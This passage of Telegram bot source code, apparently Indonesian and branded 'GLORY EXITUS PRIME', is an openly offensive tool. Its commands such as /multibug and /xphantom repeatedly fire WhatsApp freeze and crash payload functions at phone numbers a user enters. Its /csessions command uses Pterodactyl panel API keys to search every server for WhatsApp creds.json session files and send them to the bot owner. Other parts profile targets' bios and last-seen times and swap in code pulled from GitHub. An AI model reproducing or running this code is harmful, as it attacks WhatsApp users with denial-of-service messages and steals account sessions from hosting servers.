X-Frame  : ${headers["x-frame-options"] ? "Yes" : "No"}

⚠️ *Note*
• Data publik
• Aman & legal
\`\`\``;

    ctx.reply(output, {
      reply_to_message_id: replyId,
      parse_mode: "Markdown"
    });

  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal analisis website.", { reply_to_message_id: replyId });
  }
});

bot.command("statuswebsite", async (ctx) => {
  const url = ctx.message.text.split(" ")[1];

  if (!url)
    return ctx.reply("❌ Gunakan:\n/statuswebsite https://example.com");

  let target = url;
  if (!/^https?:\/\//i.test(target)) {
    target = "http://" + target;
  }

  const msg = await ctx.reply("🔍 Mengecek status website...");

  try {
    const start = Date.now();
    const res = await axios.get(target, {
      timeout: 8000,
      validateStatus: () => true
    });
    const ping = Date.now() - start;

    let statusText = "🟢 ONLINE";
    if (res.status >= 400) statusText = "🟠 ERROR RESPONSE";

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
`🌐 *STATUS WEBSITE*

🔗 URL: ${target}
📡 Status: ${statusText}
📄 HTTP Code: ${res.status}
⏱ Response Time: ${ping} ms

✅ Website masih bisa diakses Jier😭🗿😌`,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
`🌐 *STATUS WEBSITE*

🔗 URL: ${target}
🔴 Status: DOWN WKWKWK
⏱ Timeout / No Response

❌ Website tidak dapat diakses mampus`,
      { parse_mode: "Markdown" }
    );
  }
});





bot.command("multibug", async (ctx) => {
    const text = ctx.message.text;
    const args = text.split(" ").slice(1).join(" ");

    if (!args) {
      return ctx.reply(
        "❌ *Format salah*\n\n" +
        "📌 Contoh:\n" +
        "`/multibug 62xxx, 62xxxx, 62xxxxx`"
      );
    }

    const numbers = args
      .split(",")
      .map(v => v.replace(/[^0-9]/g, ""))
      .filter(v => v.length > 5);

    if (numbers.length === 0) {
      return ctx.reply("❌ Tidak ada nomor valid yang bisa diproses.");
    }

    const targets = numbers.map(n => n + "@s.whatsapp.net");
    const totalTarget = targets.length;

    let progressMsg = await ctx.reply(
      "🚀 *MULTI BUG STARTED*\n\n" +
      `🎯 Total Target : ${totalTarget}\n` +
      `⏳ Status       : Initializing...\n` +
      `📊 Progress     : 0%`
    );

    for (let index = 0; index < targets.length; index++) {
      const target = targets[index];
      const current = index + 1;
      const percent = Math.floor((current / totalTarget) * 100);

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        "⚡ *MULTI BUG IN PROGRESS*\n\n" +
        `🎯 Target        : ${target.replace("@s.whatsapp.net", "")}\n` +
        `📌 Urutan        : ${current} / ${totalTarget}\n` +
        `📊 Progress      : ${percent}%\n` +
        `🛠 Step          : Preparing...`
      );

      const loopBug = 10;
      for (let i = 0; i < loopBug; i++) {
        await sleep(1000);
        await FrezeCombined(sock, target)
        await sleep(1000);

        console.log(`⚔️ MULTI NUMBER BUG → ${target} | Loop ${i + 1}/${maxLoop}`);
      }

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        "⚡ *MULTI BUG IN PROGRESS*\n\n" +
        `🎯 Target        : ${target.replace("@s.whatsapp.net", "")}\n` +
        `📌 Urutan        : ${current} / ${totalTarget}\n` +
        `📊 Progress      : ${percent}%\n` +
        `✅ Status        : Target selesai`
      );

      await sleep(1500);
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      progressMsg.message_id,
      null,
      "✅ *MULTI BUG COMPLETED*\n\n" +
      `🎯 Total Target : ${totalTarget}\n` +
      `📊 Progress     : 100%\n` +
      `🔥 Status       : All target processed`
  );
});

bot.command("cekid", async (ctx) => {
  if (!ctx.message) return;

  let target;

  // === REPLY TEXT SI ANJING ===
  if (ctx.message.reply_to_message) {
    target = ctx.message.reply_to_message.from;
  }

  // === PAKE USERBAME SI TOLOL @ ===
  else {
    const args = ctx.message.text.split(" ").slice(1);
    if (!args[0] || !args[0].startsWith("@"))
      return ctx.reply("⚠️ Salah Tolol!:\n/cekid @username\natau reply user");

    try {
      // Telegram TIDAK bisa get user by username
      return ctx.reply(
        "❌ dongo gabisa cek ID via @username tanpa reply.\n📛 Silakan reply pesan user tersebut."
      );
    } catch {
      return ctx.reply("❌ User tidak ditemukan");
    }
  }

  // === Validate User Si hama ===
  if (!target.username) {
    return ctx.reply(
`❌ *GAGAL CEK USER*

👤 Nama: ${target.first_name}
📛 User tersebut *tidak menggunakan username*`,
      { parse_mode: "Markdown" }
    );
  }

  // === End ===
  ctx.reply(
`✅ *USER DITEMUKAN*

👤 Nama: ${target.first_name}
🆔 ID: \`${target.id}\`
🔗 Username: @${target.username}`,
    { parse_mode: "Markdown" }
  );
});


bot.command("cekbio", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekbio 62×××");
    }

    const q = args[1];
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `\`\`\`js
⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Status: Checking...
⌑ Type: WhatsApp Bio Check
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 ☇ Target", url: `https://wa.me/${q}`, style: "primary" }]
            ]
        }
    });

    try {
 
        const contact = await sock.onWhatsApp(target);
        
        if (!contact || contact.length === 0) {
            await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                processMsg.message_id,
                undefined,
                `\`\`\`js
⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Status: ❌ Not Found
⌑ Message: Nomor tidak terdaftar di WhatsApp
\`\`\``,
                {
                    parse_mode: "Markdown",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "📱 ☇ Target", url: `https://wa.me/${q}`, style: "primary" }]
                        ]
                    }
                }
            );
            return;
        }
 
        const contactDetails = await sock.fetchStatus(target).catch(() => null);
        const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        
        const bio = contactDetails?.status || "Tidak ada bio";
        const lastSeen = contactDetails?.lastSeen ? 
            moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : 
            "Tidak tersedia";

        const caption = `\`\`\`js
⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡
📱 <b>Nomor:</b> ${q}
👤 <b>Status WhatsApp:</b> ✅ Terdaftar
📝 <b>Bio:</b> ${bio}
👀 <b>Terakhir Dilihat:</b> ${lastSeen}
${profilePicture ? '🖼 <b>Profile Picture:</b> ✅ Tersedia' : '🖼 <b>Profile Picture:</b> ❌ Tidak tersedia'}

🕐 <i>Diperiksa pada: ${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</i>
\`\`\``;

        // Jika ada profile picture, kirim bersama foto profil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: caption,
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}`, style: "primary"}]
                       
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: caption,
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}`, style: "primary"}]
                      
                    ]
                }
            });
        }

 
        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking bio:", error);
        
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsg.message_id,
            undefined,
            `\`\`\`js
⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Status: ❌ Error
⌑ Message: Gagal mengambil data bio
\`\`\``,
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 ☇ Target", url: `https://wa.me/${q}`, style: "primary"}]
                    ]
                }
            }
        );
    }
});
// =================== /carisesi ===================




const fsp = fs.promises;
// ================== LOAD CONFIG FROM update.js (NO CACHE) ==================
function loadUpdateConfig() {
  try {
    // pastikan ambil dari root project (process.cwd()), bukan lokasi file lain
    const cfgPath = path.join(process.cwd(), "update.js");

    // hapus cache require biar selalu baca update.js terbaru setelah restart/update
    try {
      delete require.cache[require.resolve(cfgPath)];
    } catch (_) {}

    const cfg = require(cfgPath);
    return (cfg && typeof cfg === "object") ? cfg : {};
  } catch (e) {
    return {};
  }
}

const UPD = loadUpdateConfig();

// ====== CONFIG ======
const GITHUB_OWNER = UPD.github_owner || "Rafijahat13";
const DEFAULT_REPO = UPD.github_repo_default || "Autoupdate";
const GITHUB_BRANCH = UPD.github_branch || "main";
const UPDATE_FILE_IN_REPO = UPD.update_file_in_repo || "index.js";

// token untuk WRITE (add/del)
const GITHUB_TOKEN_WRITE = UPD.github_token_write || "";

// target lokal yang bakal diganti oleh /update
const LOCAL_TARGET_FILE = path.join(process.cwd(), "index.js");

// ================== FETCH HELPER ==================
const fetchFn = global.fetch || ((...args) => import("node-fetch").then(({ default: f }) => f(...args)));

// ================== FILE WRITE ATOMIC ==================
async function atomicWriteFile(targetPath, content) {
  const dir = path.dirname(targetPath);
  const tmp = path.join(dir, `.update_tmp_${Date.now()}_${path.basename(targetPath)}`);
  await fsp.writeFile(tmp, content, { encoding: "utf8" });
  await fsp.rename(tmp, targetPath);
}

// ================== READ (PUBLIC): DOWNLOAD RAW ==================
async function ghDownloadRawPublic(repo, filePath) {
  const rawUrl =
    `https://raw.githubusercontent.com/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/${encodeURIComponent(GITHUB_BRANCH)}/${filePath}`;

  const res = await fetchFn(rawUrl, { headers: { "User-Agent": "telegraf-update-bot" } });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`Gagal download ${filePath} (${res.status}): ${txt || res.statusText}`);
  }
  return await res.text();
}

// ================== WRITE (BUTUH TOKEN): GITHUB API ==================
function mustWriteToken() {
  if (!GITHUB_TOKEN_WRITE) {
    throw new Error("Token WRITE kosong. Isi github_token_write di update.js (Contents: Read and write).");
  }
}

function ghWriteHeaders() {
  mustWriteToken();
  return {
    Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "telegraf-gh-writer",
  };
}

async function ghGetContentWrite(repo, filePath) {
  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}?ref=${encodeURIComponent(GITHUB_BRANCH)}`;

  const res = await fetchFn(url, { headers: ghWriteHeaders() });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub GET ${res.status}: ${txt || res.statusText}`);
  }
  return res.json();
}

async function ghPutFileWrite(repo, filePath, contentText, commitMsg) {
  let sha;
  try {
    const existing = await ghGetContentWrite(repo, filePath);
    sha = existing?.sha;
  } catch (e) {
    if (!String(e.message).includes(" 404")) throw e; // 404 => create baru
  }

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = {
    message: commitMsg,
    content: Buffer.from(contentText, "utf8").toString("base64"),
    branch: GITHUB_BRANCH,
    ...(sha ? { sha } : {}),
  };

  const res = await fetchFn(url, {
    method: "PUT",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub PUT ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

async function ghDeleteFileWrite(repo, filePath, commitMsg) {
  const info = await ghGetContentWrite(repo, filePath);
  const sha = info?.sha;
  if (!sha) throw new Error("SHA tidak ketemu. Pastikan itu file (bukan folder).");

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = { message: commitMsg, sha, branch: GITHUB_BRANCH };

  const res = await fetchFn(url, {
    method: "DELETE",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub DELETE ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

// ================== COMMANDS ==================

// /update [repoOptional]
// download update_index.js -> replace local index.js -> restart
bot.command("pullupdate", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    await ctx.reply("🔄 Bot akan update otomatis.\n♻️ Tunggu proses 1–3 menit...");
    await ctx.reply(`⬇️ Mengambil update dari GitHub: *${repo}/${UPDATE_FILE_IN_REPO}* ...`, { parse_mode: "Markdown" });

    const newCode = await ghDownloadRawPublic(repo, UPDATE_FILE_IN_REPO);

    if (!newCode || newCode.trim().length < 50) {
      throw new Error("File update terlalu kecil/kosong. Pastikan update_index.js bener isinya.");
    }

    // backup index.js lama
    try {
      const backup = path.join(process.cwd(), "index.backup.js");
      await fsp.copyFile(LOCAL_TARGET_FILE, backup);
    } catch (_) {}

    await atomicWriteFile(LOCAL_TARGET_FILE, newCode);

    await ctx.reply("✅ Update berhasil diterapkan.\n♻️ Restarting panel...");

    setTimeout(() => process.exit(0), 3000);
  } catch (err) {
    await ctx.reply(`❌ Update gagal: ${err.message || String(err)}`);
  }
});

// /addfiles <repo> (reply file .js)
bot.command("addfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    const replied = ctx.message.reply_to_message;
    const doc = replied?.document;

    if (!doc) {
      return ctx.reply("❌ Reply file .js dulu, lalu ketik:\n/addfiles <namerepo>\nContoh: /addfiles Pullupdate");
    }

    const fileName = doc.file_name || "file.js";
    if (!fileName.endsWith(".js")) return ctx.reply("❌ File harus .js");

    await ctx.reply(`⬆️ Uploading *${fileName}* ke repo *${repo}*...`, { parse_mode: "Markdown" });

    const link = await ctx.telegram.getFileLink(doc.file_id);
    const res = await fetchFn(link.href);
    if (!res.ok) throw new Error(`Gagal download file telegram: ${res.status}`);

    const contentText = await res.text();

    await ghPutFileWrite(repo, fileName, contentText, `Add/Update ${fileName} via bot`);

    await ctx.reply(`✅ Berhasil upload *${fileName}* ke repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});

// /delfiles <repo> <path/file.js>
bot.command("dellfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;
    const file = parts[2];

    if (!file) {
      return ctx.reply("Format:\n/delfiles <namerepo> <namefiles>\nContoh: /delfiles Pullupdate index.js");
    }

    await ctx.reply(`🗑️ Menghapus *${file}* di repo *${repo}*...`, { parse_mode: "Markdown" });

    await ghDeleteFileWrite(repo, file, `Delete ${file} via bot`);

    await ctx.reply(`✅ Berhasil hapus *${file}* di repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});
  
// ====== /restart ======
bot.command("restart", async (ctx) => {
  await ctx.reply("♻️ Panel akan *restart manual* untuk menjaga kestabilan...");

  // kirim status ke grup utama kalau ada
  try {
    if (typeof sendToGroupsUtama === "function") {
      sendToGroupsUtama(
        "🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...",
        { parse_mode: "Markdown" }
      );
    }
  } catch (e) {}

  setTimeout(() => {
    try {
      if (typeof sendToGroupsUtama === "function") {
        sendToGroupsUtama(
          "🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!",
          { parse_mode: "Markdown" }
        );
      }
    } catch (e) {}
  }, 8000);

  setTimeout(() => process.exit(0), 5000);
});






bot.command("csessions", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 Example : /csessions <domain>,<ptla>,<ptlc>");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 Example : /csessions <domain>,<ptla>,<ptlc>");

  await ctx.reply(
    "⏳ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ Terjadi error saat scan");
  }
});

const delay = (ms) => new Promise(res => setTimeout(res, ms));
        const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);
//============( MENU UTAMA ) =======\\
bot.use((ctx, next) => {
  if (secureMode) return;
  return next();
});

const userFirstStart = new Set();

bot.start(async ctx => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;

  if (!userFirstStart.has(userId)) {
    userFirstStart.add(userId);

    const progressMsg = await ctx.reply("⌛ *Memuat Script...*", {
      parse_mode: "Markdown",
    });
    await new Promise(resolve => setTimeout(resolve, 800));
    await ctx.telegram.editMessageText(
      chatId,
      progressMsg.message_id,
      null,
      "✅ *Script berhasil diakses*",
      { parse_mode: "Markdown" }
    );
    await new Promise(resolve => setTimeout(resolve, 800));
    await ctx.telegram.editMessageText(
      chatId,
      progressMsg.message_id,
      null,
      "😈GLORY EXITUS PRIME ⚠️....",
      { parse_mode: "Markdown" }
    );
    await new Promise(resolve => setTimeout(resolve, 500));
    await ctx.deleteMessage(progressMsg.message_id);
  }

    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    
    const menuMessage = `<blockquote><pre>
<b>𑁍┊GLORY EXITUS PRIME 4.0.0</b>     
━━━━━━━━━━━━━━⪼
┏━⪼ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚂𝙸 𝚂𝙲𝚁𝙸𝙿𝚃
┊⛨ Developer : @R4f14ndr4
┊⛨ Platform : Telegram
┊⛨ Version: 4.0.0
┊⛨ Protection : ACTIVE
┊⛨ RilisDate : 17/8/26
┊⛨ ScriptName : EXE-CUTIVE


tes update
┗━━━━━━━━━━━━━━━━━━
© 2026 - 2027 | All Rights Reserved
</pre></blockquote>`;

const keyboard = [
    [
        { text: "𝗕𝗨𝗚", callback_data: "/bug", style: "danger" },
        { text: "𝗧𝗢𝗢𝗟𝗦", callback_data: "/controls", style: "primary" }
    ],
    [
        { text: "𝗢𝗪𝗡𝗘𝗥", url: "https://t.me/R4f14ndr4", style: "primary" },
        { text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url: "https://t.me/GLORYEXITUS", style: "success" }
    ]
];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('/start', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  
    const menuMessage = `<blockquote><pre>
<b>𑁍┊GLORY EXITUS PRIME 4.0.0</b>     
━━━━━━━━━━━━━━⪼
┏━⪼ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚂𝙸 𝚂𝙲𝚁𝙸𝙿𝚃
┊⛨ Developer : @R4f14ndr4
┊⛨ Platform : Telegram
┊⛨ Version: 4.0.0
┊⛨ Protection : ACTIVE
┊⛨ RilisDate : 17/8/26
┊⛨ ScriptName : EXE-CUTIVE
┗━━━━━━━━━━━━━━━━━━
© 2026 - 2027 | All Rights Reserved
</pre></blockquote>`;

const keyboard = [
    [
        { text: "𝗕𝗨𝗚", callback_data: "/bug", style: "danger" },
        { text: "𝗧𝗢𝗢𝗟𝗦", callback_data: "/controls", style: "primary" }
    ],
    [
        { text: "𝗢𝗪𝗡𝗘𝗥", url: "https://t.me/R4f14ndr4", style: "primary" },
        { text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url: "https://t.me/GLORYEXITUS", style: "success" }
    ]
];
    
    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});


bot.action('/controls', async (ctx) => {
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const controlsMenu = `<blockquote><pre>
<b>𑁍┊GLORY EXITUS PRIME</b>
━━━━━━━━━━━━━━⪼
┏━⪼ 𝙲𝙾𝙽𝚃𝚁𝙾𝙻 𝙼𝙴𝙽𝚄
┊⌬ /addsender - Add Sender Number
┊⌬ /resetsession - Reset Existing Session
┊⌬ /setcooldown - Set Bot Cooldown
┊⌬ /addprem - Add Premium Users
┊⌬ /delprem - Delete Premium Users
┊⌬ /addpremgrup - Add Premium Group (member harus chat di gb biar ke ditek)
┊⌬ /delpremgrup - Delete Premium Group
┊⌬ /command - Block And Unblock Command
┗━━━━━━━━━━━━━━━━━━━━━━━━⪼
© 2026 - 2027 | All Rights Reserved
</pre></blockquote>`;

    const keyboard = [
        [
            { text: "🔙 𝗕𝗔𝗖𝗞", callback_data: "/start", style: "primary" }
        ],
        [
            { text: "📢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url: "https://t.me/GLORYEXITUS", style: "success" }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `<blockquote><pre>
<b>𑁍┊GLORY EXITUS PRIME</b>
━━━━━━━━━━━━━━⪼
┏━⪼ 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞
┊⌬ /xflower [ Freeze Invisible Hard ]
┊⌬ /xspam [ Freeze Invisible Spam Free ]
┊⌬ /xphantom [ WhatsApp Delay Freeze  ]
┊⌬ /xstorm [ blank WhatsApp invisible  ]
┊⌬ /xdelay [ Delay Chat Invisible ]
┗━━━━━━━━━━━━━━━━━━━━━━━━⪼
┏━⪼ 𝐌𝐮𝐥𝐭𝐢 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞
┊⌬ /multibug [ Bug Lebih Dari 1 Nomor ]
┊⌬ Example: /multibug 62xxxx, 62xxxx, 62xxxx
┗━━━━━━━━━━━━━━━━━━━━━━━━⪼
© 2026 - 2027 | All Rights Reserved
</pre></blockquote>`;

    const keyboard = [
        [
            { text: "🔙 𝗕𝗔𝗖𝗞", callback_data: "/start", style: "primary" }
        ],
        [
            { text: "📢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url: "https://t.me/GLORYEXITUS", style: "success" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

//============( CASE BUG ) =======\\
bot.command("xphantom", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  const blocked = getBlocked();
  if (blocked.includes("xphantom")) {
    return ctx.reply("⛔ Command ini sedang diblok oleh owner.");
  }

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xphantom 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMessage = await ctx.replyWithPhoto(
    "https://ganga--link--ghhzdp9sv8hk.code.run/i/ei3e9914",
    {
      caption: `<blockquote><pre>
<b>𑁍┊GLORY EXITUS PRIME</b>
━━━━━━━━━━━━━━⪼
┊ Target: ${q}
┊ Type: WhatsApp Delay Freeze 
┊ Status: ✅ Success 
</pre></blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
        ]]
      }
    }
  );

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 40; i++) {
    await FrezeCombined(sock, target)
    await Rena4YouDelayInvis(sock, target)
    await sleep(800);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote><pre>
<b>𑁍┊GLORY EXITUS PRIME</b>
━━━━━━━━━━━━━━⪼
